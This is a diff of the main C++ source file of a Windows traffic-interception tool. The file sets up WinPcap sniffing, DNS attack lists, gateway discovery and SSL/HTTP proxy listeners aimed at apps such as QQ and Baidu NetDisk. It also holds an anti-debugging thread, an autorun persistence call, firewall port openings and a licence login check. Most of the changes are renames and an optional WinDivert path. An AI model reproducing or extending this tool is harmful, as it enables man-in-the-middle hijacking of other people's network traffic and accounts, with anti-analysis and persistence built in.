@@ -13,12 +13,12 @@
 #include <string.h>
 #include "include\\pcap.h"
 #include "include\\pcap\\pcap.h"
-
+#include "main.h"
 #include "attacker.h"
 #include "Public.h"
 #include "Packet.h"
 #include "snifferpacket.h"
-#include "NetCardInfo.h"
+#include "NetworkDevice.h"
 #include "Confiig.h"
 
 #include "attack.h"
@@ -36,7 +36,7 @@
 #include "dnsutils/DnsProxy.h"
 #include "ssl/HttpProxyListener.h"
 #include "ssl/SSLProxyListener.h"
-#include "ssl/informerProc.h"
+#include "ssl/informerServer.h"
 #include "ssl/baofeng.h"
 #include "ssl/QQManager.h"
 #include "ssl/QQAndroid.h"
@@ -63,42 +63,30 @@
 #include "ssl/baiduNetDisk.h"
 #include "ssl/peanutShell.h"
 #include <conio.h>
+#include "myDvert.h"
 
 #pragma comment(lib,"ws2_32.lib")
 #pragma comment(lib,"dbghelp.lib")
 #pragma comment(lib,"Iphlpapi.lib")
-#pragma comment(lib,"./lib\\wpcap.lib")
-#pragma comment(lib,"./lib\\zlib.lib")
 #pragma comment(lib,"Advapi32.lib")
 
+#pragma comment(lib,"./lib\\wpcap.lib")
+#pragma comment(lib,"./lib\\wpcap.dll")
+#pragma comment(lib,"./lib\\zlib.lib")
 #pragma comment(lib,"./lib\\libcrypto.lib")
 #pragma comment(lib,"./lib\\libssl.lib")
 #pragma comment(lib,"./lib\\openssl.lib")
 
-using namespace std;
+//#define WINDIVERT_APPROACH
 
-#define TERMINAL_ATTACK_MODE		1
-#define TERMINAL_SERVER_MODE		2
-#define LOOP_TEST_MODE				3
+using namespace std;
 
 
 int gAttackMode = 0;
 
-//mmgr.myapp.com/myapp/wesecure_apk/kingcardext/kcsdk_5.0.0.3818.jar
-
 
 void test() {
-	int ret = 0;
-	return;
 
-	//ret = Compress::gzfile("config.ini", "test.zip");
-
-	FileOper::initKey();
-	char data[0x8000];
-	HTTPPROXYPARAM param = { 0 };
-	lstrcpyA(param.username, "jy20200614");
-
-	return;
 }
 
 
@@ -108,33 +96,33 @@ int main(int argc, char** argv)
 	test();
 #endif
 
-	int	nRetCode = 0;
+	int	ret = 0;
 	char szout[1024];
 
 	string username = "";
 	string password = "";
-	int netcard_selected = -1;
+	int netcard_target = -1;
 	if (argc >= 4)
 	{
 		username = argv[1];
 		password = argv[2];
-		netcard_selected = atoi(argv[3]);
+		netcard_target = atoi(argv[3]);
 	}
 
-	HANDLE hMutext = (HANDLE)Public::checkInstanceExist();
+	HANDLE hMutext = (HANDLE)Public::singleInstance();
 	if (hMutext == FALSE)
 	{
-		printf("program has already be running\n");
-		_getch();
+		printf("program had already been running\n");
+		ret = _getch();
 		exit(-1);
 	}
 
 	WSADATA	stWsa = { 0 };
-	nRetCode = WSAStartup(WSASTARTUP_VERSION, &stWsa);
-	if (nRetCode)
+	ret = WSAStartup(WSASTARTUP_VERSION, &stWsa);
+	if (ret)
 	{
 		printf("WSAStartup error code:%d\n", GetLastError());
-		_getch();
+		ret=_getch();
 		exit(-1);
 	}
 
@@ -146,119 +134,130 @@ int main(int argc, char** argv)
 	unsigned long serverIP = 0;
 	char szgwmac[64] = { 0 };
 	string servername = "";
-	vector<string> gDnsAttackList = Config::parseAttackCfg(path + CONFIG_FILENAME, &serverIP, &winpcapDelay, &opensslctrl, &gAttackMode, szgwmac, servername);
+	vector<string> gDnsAttackList = Config::parseAttackCfg(path + CONFIG_FILENAME, &serverIP, &winpcapDelay,
+		&opensslctrl, &gAttackMode, szgwmac, servername);
 	if (gDnsAttackList.size() == 0) {
 		printf("parse config file:%s error\r\n", CONFIG_FILENAME);
-		_getch();
+		ret = _getch();
 		return -1;
 	}
 
-
-	int cnt = Config::parseDnsCfg(DNS_FILENAME, gDnsAttackList);
-	printf("parse dns attack url total:%u\r\n", cnt);
-
-#ifndef _DEBUG
-
-	nRetCode = Security::loginCheck(gAttackMode, username, password);
-	if (nRetCode <= 0)
+	int dnsItemCnt = Config::parseDnsCfg(DNS_FILENAME, gDnsAttackList);
+	printf("parse dns total:%u\r\n", dnsItemCnt);
+	
+	ret = Security::loginCheck(gAttackMode, username, password);
+	if (ret <= 0)
 	{
 		printf("username or password error\r\n");
-		_getch();
+		ret = _getch();
 		exit(-1);
 	}
-#endif
-
-	unsigned long localIP = 0;
-	unsigned long netmask = 0;
-	unsigned long netgateIP = 0;
-	unsigned char localMac[MAC_ADDRESS_SIZE] = { 0 };
-
-	string adaptername = NetCardInfo::selectNetcard(&localIP, &netmask, &netgateIP, localMac, netcard_selected);
+	
+	string adaptername = NetworkDevice::ChooseNetcard(&gLocalIP, &gNetmask, &gRouterIP, gLocalMac, netcard_target,&gDnsServer);
 	if (adaptername == "")
 	{
 		printf("selectNetcard error\r\n");
-		_getch();
+		ret = _getch();
 		return -1;
 	}
 
-	if (gAttackMode == LOOP_TEST_MODE)
+	if (gAttackMode == ATTACK_TEST_MODE)
 	{
-		serverIP = localIP;
+		serverIP = gLocalIP;
 	}
-	else if (gAttackMode == TERMINAL_SERVER_MODE)
-	{
-		//make sure serverip is correct in this mode
-	}
-	else if (gAttackMode == TERMINAL_ATTACK_MODE)
+	else if (gAttackMode == ATTACK_SERVER_MODE)
 	{
 		//make sure serverip is correct in this mode
 	}
-
+	else if (gAttackMode == ATTACK_CLIENT_MODE)
+	{
+		//make sure serverip is correct in this mode
+	}
 
 #ifndef _DEBUG
-	nRetCode = Tools::autorun(username, password, netcard_selected);
+	ret = Tools::autorun(username, password, netcard_selected);
 	DWORD debugTd = 0;
-	CloseHandle(CreateThread(0, PROXY_THREAD_STACK_SIZE, (LPTHREAD_START_ROUTINE)Security::antiDebug, 0, STACK_SIZE_PARAM_IS_A_RESERVATION, &debugTd));
+	CloseHandle(CreateThread(0, PROXY_THREAD_STACK_SIZE, (LPTHREAD_START_ROUTINE)Security::antiDebug, 0,
+		STACK_SIZE_PARAM_IS_A_RESERVATION, &debugTd));
 #endif
 
 	string devname = string(WINPCAP_NETCARD_NAME_PREFIX) + adaptername;
-	pcap_t* pcapt = Winpcap::init(devname, winpcapDelay, netmask);
+	pcap_t* pcapt = Winpcap::init(devname, winpcapDelay, gNetmask);
 	if (pcapt == 0)
 	{
 		printf("winpcap init error\r\n");
-		_getch();
+		ret = _getch();
 		return -1;
 	}
-	printf("device name:%s,netmask:%08x,winpcap delay:%d\r\n", devname.c_str(), netmask, winpcapDelay);
+	printf("device name:%s,netmask:%08x,winpcap delay:%d\r\n", devname.c_str(), gNetmask, winpcapDelay);
 
-	//vector，set，map这些容器的end()取出来的值实际上并不是最后一个值，而end的前一个才是最后一个值,需要用prev(xxx.end())，才能取出容器中最后一个元素
+	//vector、set、map这些容器的end()取出来的值不是最后一个、end的前一个才是最后一个,prev(xxx.end())取出最后一个
 	auto iter = unique(gDnsAttackList.begin(), gDnsAttackList.end());
 	gDnsAttackList.erase(iter, gDnsAttackList.end());
 
 	vector<string> gHostAttackList = gDnsAttackList;
 	gHostAttackList.push_back(HttpUtils::getIPstr(serverIP));
-	gHostAttackList.push_back(HttpUtils::getIPstr(localIP));
+	gHostAttackList.push_back(HttpUtils::getIPstr(gLocalIP));
 	gHostAttackList.push_back("127.0.0.1");
 
-	nRetCode = Config::shiftDnsFormat(gDnsAttackList);
+	ret = Config::shiftDnsFormat(gDnsAttackList);
 
 	DnsUitls* dnsutils = new DnsUitls(gDnsAttackList);
 
 	DWORD cmode = 0;
 	HANDLE hc = GetStdHandle(STD_INPUT_HANDLE);
-	nRetCode = GetConsoleMode(hc, &cmode);
-	nRetCode = SetConsoleMode(hc, ~ENABLE_QUICK_EDIT_MODE);
-
+	ret = GetConsoleMode(hc, &cmode);
+	//nRetCode = SetConsoleMode(hc, ~ENABLE_QUICK_EDIT_MODE);
 
 	printf("checking encryption files,please wait...\r\n");
 	string pluginPath = Public::getPluginPath();
-	nRetCode = FileOper::checkFileCryption(pluginPath);
+	ret = FileOper::checkFileCryption(pluginPath);
 
-	gLocalIPAddr = localIP;
 	gServerIP = serverIP;
 	gLocalPath = path;
 
 	in_addr ia = { 0 };
-	ia.S_un.S_addr = gLocalIPAddr;
+	ia.S_un.S_addr = gLocalIP;
 	gstrLocalIP = inet_ntoa(ia);
 	ia.S_un.S_addr = gServerIP;
 	gstrServerIP = inet_ntoa(ia);
-	HttpUtils::ipv4toipv6((unsigned char*)&gLocalIPAddr, gLocalIPAddrV6);
+	HttpUtils::ipv4toipv6((unsigned char*)&gLocalIP, gLocalIPV6);
 
-	if (gAttackMode == TERMINAL_SERVER_MODE || gAttackMode == LOOP_TEST_MODE) {
+	if (gAttackMode == ATTACK_SERVER_MODE || gAttackMode == ATTACK_TEST_MODE) {
 
-		nRetCode = Tools::addFirewallPort(HTTP_PORT, "HTTP", "TCP");
-		nRetCode = Tools::addFirewallPort(SSL_PORT, "SSL", "TCP");
-		nRetCode = Tools::addFirewallPort(INFORMER_PORT, "INFORMER", "TCP");
+		ret = Tools::addFirewallPort(HTTP_PORT, "HTTP", "TCP");
+		ret = Tools::addFirewallPort(SSL_PORT, "SSL", "TCP");
+		ret = Tools::addFirewallPort(INFORMER_PORT, "INFORMER", "TCP");
 
-		nRetCode = SSLEntry::sslEntry(serverIP, localIP, path, opensslctrl, gDnsAttackList, gHostAttackList, gAttackMode);
+		ret = SSLEntry::sslEntry(serverIP, gLocalIP, path, opensslctrl, gDnsAttackList, gHostAttackList, gAttackMode);
 
-		nRetCode = Tools::setNetworkParams();
+		ret = Tools::setNetworkParams();
 
 		printf("server has been ready to work...\r\n");
 	}
 
-	if (gAttackMode == TERMINAL_SERVER_MODE)
+	if (gAttackMode == ATTACK_SERVER_MODE || gAttackMode == ATTACK_TEST_MODE || gAttackMode == ATTACK_STANDBY_MODE) {
+		string searchpath = gLocalPath + "plugin\\";
+		vector<string>usernames;
+		ret = FileOper::searchDir((char*)searchpath.c_str(), usernames);
+		
+		for (int i = 0; i < usernames.size(); i++) {
+			printf("\r\n%d.\t\t%s\r\n",i, usernames[i].c_str());
+		}
+
+		do
+		{
+			int packnum = 0;
+			printf("\r\nPlease input the number of the server packet:\r\n");
+			//scanf("%d", &packnum);
+			if (packnum < usernames.size() && packnum >= 0) {
+				lstrcpyA(G_USERNAME, usernames[packnum].c_str());
+				break;
+			}
+		} while (1);
+	}
+
+	if (gAttackMode == ATTACK_SERVER_MODE)
 	{
 		//nRetCode = Tools::initException(hMutext, username, password, netcard_selected);
 		Sleep(-1);
@@ -267,20 +266,20 @@ int main(int argc, char** argv)
 	//printf("set server ip:%s,attack ip:%s,default user:%s\r\n", servername.c_str(), HttpUtils::getIPstr(localIP).c_str(),G_USERNAME);
 	//inet_ntoa返回一个字符指针，指向一块存储着点分格式IP地址的静态缓冲区（同一线程内共享此内存）
 
-	if (gAttackMode == TERMINAL_ATTACK_MODE || gAttackMode == LOOP_TEST_MODE)
+	if (gAttackMode == ATTACK_CLIENT_MODE || gAttackMode == ATTACK_TEST_MODE || gAttackMode == ATTACK_STANDBY_MODE)
 	{
 		string userpluginPath = Public::getDefaultUserPluginPath();
-		nRetCode = access(userpluginPath.c_str(), 0);
-		if (nRetCode)
+		ret = access(userpluginPath.c_str(), 0);
+		if (ret)
 		{
 			wsprintfA(szout, "attack data store:%s not exist!\r\n", G_USERNAME);
 			printf(szout);
-			_getch();
+			ret=_getch();
 			exit(-1);
 		}
 
 		printf("parsing gateway mac and ip,please wait...\r\n");
-		Gateway* gateway = new Gateway(pcapt, serverIP, localIP, localMac);
+		Gateway* gateway = new Gateway(pcapt, serverIP, gLocalIP, gLocalMac);
 
 		int totalpack = gateway->getGateWay();
 		// 		if (totalpack)
@@ -292,23 +291,25 @@ int main(int argc, char** argv)
 
 		printf("attacker has been ready to work...\r\n");
 
-		nRetCode = SnifferPacket::peeping(pcapt, serverIP, localIP, userpluginPath, gAttackMode);
-
+#ifndef WINDIVERT_APPROACH
+		ret = SnifferPacket::peeping(pcapt, serverIP, gLocalIP, userpluginPath, gAttackMode);
 		pcap_close(pcapt);
+#else
+		ret = CloseHandle(CreateThread(0,0,(LPTHREAD_START_ROUTINE) winDivert,(LPVOID)gLocalIP,0,0));
+		Sleep(-1);
+#endif		
 	}
 
-	return nRetCode;
+	return ret;
 }
 
 /*
-0000:0000:0000:0000:0000:0000:6a0e:90b3
-6a0e 90b3
-135.75.43.52 按十六进制算出即87.4B.2B.34，
-而87.4B.2B.34串地址一组还是8位，所以需要两组v4地址合成v6地址，
-再把前96位补零，它可以被转化为
+v4地址转化v6地址，再把前96位补零
 0000:0000:0000:0000:0000:0000:874B:2B34或者::874B:2B34
 */
 
 //cmd执行程序时容易卡住 取消快速编辑模式
+
 //全局变量空间一般比较大，因此大小超过1M的变量尽量声明为全局变量或者静态变量。
+
 //统计代码行数 ^b*[^:b#/]+.*$
